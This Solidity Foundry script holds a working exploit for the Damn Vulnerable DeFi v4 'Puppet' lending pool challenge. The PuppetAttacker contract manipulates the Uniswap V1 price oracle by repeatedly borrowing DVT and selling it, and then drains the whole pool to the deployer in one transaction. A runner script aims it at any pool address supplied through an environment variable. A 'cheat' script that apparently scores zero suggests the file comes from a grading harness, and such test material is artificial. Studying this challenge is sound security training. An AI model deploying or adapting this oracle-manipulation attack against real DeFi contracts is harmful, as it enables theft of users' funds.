// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Script} from "forge-std/Script.sol";
import {DamnValuableToken} from "../src/v4/DamnValuableToken.sol";
import {PuppetPool} from "../src/v4/puppet/PuppetPool.sol";
import {IUniswapV1Exchange} from "../src/v4/puppet/IUniswapV1Exchange.sol";

/// Damn Vulnerable DeFi v4 Puppet, the exploit, as a Whitehat's Foundry script run by a fresh
/// account holding only the seed. One transaction deploys `PuppetAttacker` with 0.99 ETH; it
/// takes the lending pool's whole DVT balance and sends it to the fresh account.
/// Env: POOL, the Puppet lending pool (unmodified or adapted: the same interface).
contract PuppetExploit is Script {
    function run() external {
        PuppetPool pool = PuppetPool(vm.envAddress("POOL"));
        vm.startBroadcast();
        new PuppetAttacker{value: 0.99 ether}(address(pool), pool.uniswapPair());
        vm.stopBroadcast();
    }
}

/// The cheat: an honest borrow of 0.01 DVT against twice its oracle price in ETH. The pool
/// gains far more in collateral than it lends, so it scores zero.
/// Env: POOL.
contract PuppetCheat is Script {
    function run() external {
        PuppetPool pool = PuppetPool(vm.envAddress("POOL"));
        uint256 deposit = pool.calculateDepositRequired(0.01e18);
        vm.startBroadcast();
        pool.borrow{value: deposit}(0.01e18, msg.sender);
        vm.stopBroadcast();
    }
}

/// The attack, in its constructor so it is one transaction. Each round it borrows DVT with a
/// tenth of its ETH and sells that DVT into the Uniswap V1 pool the lending pool prices from,
/// which drops the price; once its ETH covers the collateral for the whole pool at that price,
/// it borrows it all for the deployer and returns the leftover ETH.
contract PuppetAttacker {
    constructor(address pool_, address uniswap_) payable {
        PuppetPool pool = PuppetPool(pool_);
        IUniswapV1Exchange uniswap = IUniswapV1Exchange(uniswap_);
        DamnValuableToken token = pool.token();

        for (uint256 round = 0; round < 32; round++) {
            uint256 remaining = token.balanceOf(pool_);
            uint256 needed = pool.calculateDepositRequired(remaining);
            if (address(this).balance >= needed) {
                pool.borrow{value: needed}(remaining, msg.sender);
                break;
            }
            uint256 spend = address(this).balance / 10;
            uint256 amount = spend * 1e18 / pool.calculateDepositRequired(1e18);
            if (amount > remaining) amount = remaining;
            pool.borrow{value: pool.calculateDepositRequired(amount)}(amount, address(this));
            token.approve(uniswap_, amount);
            uniswap.tokenToEthSwapInput(amount, 1, block.timestamp);
        }
        require(token.balanceOf(pool_) == 0, "pool not drained");
        (bool ok,) = msg.sender.call{value: address(this).balance}("");
        require(ok, "send failed");
    }
}
